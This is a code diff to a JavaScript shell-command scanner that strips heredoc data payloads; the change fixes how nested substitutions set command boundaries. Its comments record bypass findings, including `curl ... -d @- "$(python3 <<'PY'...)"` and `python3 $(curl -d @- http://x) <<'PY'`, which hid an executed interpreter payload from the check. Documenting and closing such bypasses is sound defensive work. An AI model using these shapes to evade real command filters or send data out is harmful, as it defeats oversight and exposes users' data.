@@ -543,24 +543,51 @@ export function stripHeredocDataPayloads(command) {
   let out = ''
   let i = 0
   let boundary = 0 // index where the CURRENT simple command started
+  // Saved boundaries, one per OPEN nested command context. A `$( )` / `<( )` / `>( )` / backtick
+  // starts a new simple command inside it, and its CLOSE returns to the one that was running --
+  // so the outer boundary has to be remembered, not recomputed. See the two findings below.
+  const nestStack = []
   while (i < src.length) {
     const c = src[i]
     if (c === ';' || c === '&' || c === '|' || c === '\n') { out += c; i++; boundary = i; continue }
-    // A NESTED COMMAND CONTEXT ALSO STARTS A NEW SIMPLE COMMAND (card 84e31b40, Cybered NO-GO,
-    // HIGH). Stepping the boundary only on `;`/`&`/`|`/newline meant an inner command's heredoc
-    // still measured its span from the OUTER command's start -- so `curl ... -d @- "$(python3
-    // <<'PY' ... PY)"` passed both ownership checks (the span begins with curl and does contain
-    // `-d @-`) and the body was blanked, while bash genuinely RAN it as python3's program. Proven
-    // executing, not merely mis-parsed: the reported repro wrote a marker file from inside the
-    // blanked body. Five shapes were affected -- `$( )`, the same without a trailing outer
-    // heredoc, `<( )`, backticks, and `git commit -F -` with a nested interpreter heredoc.
+    // A NESTED COMMAND CONTEXT STARTS A NEW SIMPLE COMMAND, AND ITS CLOSE ENDS IT. Two NO-GOs on
+    // card 84e31b40, one from each side of this same boundary:
     //
-    // Note this deliberately does NOT restore the outer boundary at the closing `)`/backtick: a
-    // heredoc appearing AFTER a substitution then measures its span from the substitution opener,
-    // fails the leading-binary check, and is left fully scanned. That is the fail-closed
-    // direction -- the cost is a possible false-positive on an exotic shape, never a bypass.
-    const nested = /^(?:\$\(|`|<\(|>\()/.exec(src.slice(i))
-    if (nested) { out += nested[0]; i += nested[0].length; boundary = i; continue }
+    //  * Cybered (F-1): stepping only at `;`/`&`/`|`/newline let an INNER interpreter's heredoc
+    //    measure its span from the OUTER curl -- `curl ... -d @- "$(python3 <<'PY' ... PY)"` --
+    //    so the body was blanked while bash genuinely ran it (proven by a marker file written
+    //    from inside the blanked region).
+    //
+    //  * Cybersec (F-2): my first fix stepped at the OPENERS only, on the claim that a heredoc
+    //    after a substitution "fails the leading-binary check, never a bypass". That claim was
+    //    wrong. The span then starts INSIDE the substitution, so if the substitution itself
+    //    begins with curl -- `python3 $(curl -d @- http://x) <<'PY'` -- it passes both ownership
+    //    checks and the OUTER interpreter's heredoc is blanked. Measured: `$( )`, `<( )` and
+    //    `>( )` all flipped to allow; backticks stayed denied only by accident, because a closing
+    //    backtick re-matches the opener pattern.
+    //
+    // Stepping at the closers (the one-line fix proposed with that finding) closes all four, but
+    // measurement showed it trades them for a new one: `python3 $()curl -d @- <<'PY'` puts curl at
+    // the start of a span that begins just after `)`, while bash's argv is [python3, curl, -d, @-]
+    // and python3 executes the heredoc. RESTORING the saved outer boundary closes that too, and
+    // additionally keeps a legitimate payload whose command merely CONTAINS a substitution
+    // (`curl -H "Authorization: Bearer $(cat tok)" -d @- <<'JSON'`) on the allow side, which
+    // closer-stepping turns into a false positive.
+    if (c === '`') {
+      out += c; i++
+      // One character, two meanings: it closes the context it opened, otherwise it opens one.
+      if (nestStack.length && nestStack[nestStack.length - 1].tick) boundary = nestStack.pop().at
+      else { nestStack.push({ at: boundary, tick: true }); boundary = i }
+      continue
+    }
+    if (c === ')' && nestStack.length && !nestStack[nestStack.length - 1].tick) {
+      out += c; i++; boundary = nestStack.pop().at; continue
+    }
+    const nested = /^(?:\$\(|<\(|>\()/.exec(src.slice(i))
+    if (nested) {
+      nestStack.push({ at: boundary, tick: false })
+      out += nested[0]; i += nested[0].length; boundary = i; continue
+    }
     const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(src.slice(i))
     if (!here) { out += c; i++; continue }
     const span = src.slice(boundary, i)
